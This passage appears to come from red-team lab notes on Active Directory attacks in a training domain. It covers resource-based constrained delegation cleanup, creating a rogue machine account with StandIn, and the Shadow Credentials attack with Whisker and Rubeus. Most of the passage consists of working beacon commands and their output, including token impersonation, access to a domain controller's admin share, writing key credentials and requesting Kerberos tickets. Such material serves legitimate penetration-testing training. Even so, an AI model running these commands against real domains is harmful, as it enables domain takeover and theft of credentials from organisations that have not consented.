beacon> steal_token 4092
[+] Impersonated DEV\bfarmer

beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/12/2022 09:45:09   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/12/2022 09:28:56   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/13/2022 09:25:49   DumpStack.log.tmp
 384mb    fil     09/13/2022 09:25:49   pagefile.sys
```

### Cleanup

**Simply remove the&#x20;**<mark style="color:yellow;">**`msDS-AllowedToActOnBahalfOfOtherIdentity`**</mark>**&#x20;entry on the target:**

```
beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Don't have local admin access?

You can resort to creating your own computer object. By default, even domain users can join up to 10 computers to a domain - controlled via the <mark style="color:yellow;">`ms-DS-MachineAccountQuota`</mark> attribute of the domain object.

**How-to: Viewing how many computers a user can add to a domain.**

```
beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

ms-ds-machineaccountquota
-------------------------
                       10
```

#### Create a computer with a random password

[**StandIn**](https://github.com/FuzzySecurity/StandIn) **is a post-ex toolkit written by** [**Ruben Boonen**](https://twitter.com/FuzzySec) **and has the functionality to create a computer with a random password:**

```
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
    |_ Password : oIrpupAtF1YCXaw

[+] Machine account added to AD..
```

### Obtaining TGT for the Fake Computer

**These can then be used with&#x20;**<mark style="color:yellow;">**`asktgt`**</mark>**&#x20;to obtain a TGT for the fake computer:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF8j[...]MuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  EvilComputer$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/13/2022 2:31:34 PM
  EndTime                  :  9/14/2022 12:31:34 AM
  RenewTill                :  9/20/2022 2:31:34 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
```

And the rest of the attack is the same.

## Shadow Credentials

Whilst Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, asymmetric keys are also possible via Public Key Cryptography for Initial Authentication (PKINIT).&#x20;

### Certificate Trust Model

If a PKI solution is in place, such as Active Directory Certificate Services, the Domain Controllers and domain members exchange their public keys via the appropriate Certificate Authority. This is called the Certificate Trust Model.

### Key Trust Model

This is where trust is established based on raw key data rather than a certificate. This requires a client to store their key on their own domain object in an attribute called <mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>.

### How the Shadow Credentials Attack Works

The basis of the "shadow credentials" attack is that if you can write to this attribute (<mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>), on a user or computer object, you can obtain a TGT for that principal. As such, this is a DACL-style abuse as with RBCD.

Along with his excellent [blog post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) on the subject, [Elad Shamir](https://twitter.com/elad_shamir) published a tool called [<mark style="color:yellow;">`Whisker`</mark>](https://github.com/eladshamir/Whisker), <mark style="color:$success;">which makes exploiting this very easy</mark>. &#x20;

### Performing the Attack

**First, we want to&#x20;**<mark style="color:yellow;">**list any keys that might already be present for a target**</mark>**&#x20;- this is important for when we want to clean up later:**

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
[*] Listing deviced for dc-2$:
[*] No entries!
```

**Add a&#x20;**<mark style="color:yellow;">**new key pair**</mark>**&#x20;to the target:**

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password y52EhYqlfgnYPuRb
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

**And now, we can&#x20;**<mark style="color:yellow;">**ask for a TGT using the Rubeus**</mark>**&#x20;command that Whisker provides:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: CN=dc-2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\dc-2$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIGaj [...snip...] MuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  dc-2$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  1/21/2023 7:12:27 PM
  EndTime                  :  1/22/2023 5:12:27 AM
  RenewTill                :  1/28/2023 7:12:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  bKJ76Br5CFOL6zckBpl9IA==
  ASREP (key)              :  B0AA392AE0C969E268DAC4462D76FC90
```

Whisker's <mark style="color:yellow;">`clear`</mark> command will remove any and all keys from <mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>. &#x20;

<mark style="color:$danger;">This is a bad idea if a key was already present</mark>, because it will <mark style="color:$danger;">break legitimate passwordless authentication that was in place</mark>.  If this was the case, <mark style="color:$success;">you can list the entries again and only remove the one you want</mark>.

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
[*] Listing deviced for dc-2$:
    DeviceID: 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403 | Creation Time: 1/21/2023 7:19:04 PM

beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Found value to remove
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```
